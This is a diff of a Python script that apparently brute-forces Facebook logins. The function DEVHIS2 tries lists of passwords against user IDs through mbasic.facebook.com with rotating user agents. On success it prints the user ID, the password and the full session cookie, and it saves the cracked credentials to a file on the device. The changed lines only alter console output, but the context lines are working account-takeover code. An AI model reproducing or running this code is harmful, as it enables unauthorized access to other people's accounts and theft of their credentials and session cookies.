@@ -172,7 +172,7 @@ def DEVHIS2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write(f'\r\n\033[1;92m[RUNNING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] \n\r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -209,7 +209,7 @@ def DEVHIS2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[1;92m[ACTIVE] {uid} | {ps} \nCookie : {coki}")
+                print(f"\033[1;92m[ACTIVE] {uid} | {ps} \n\033[1;37mCookie:\x1b[0m {coki}")
                 open('/sdcard/DEVHIS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
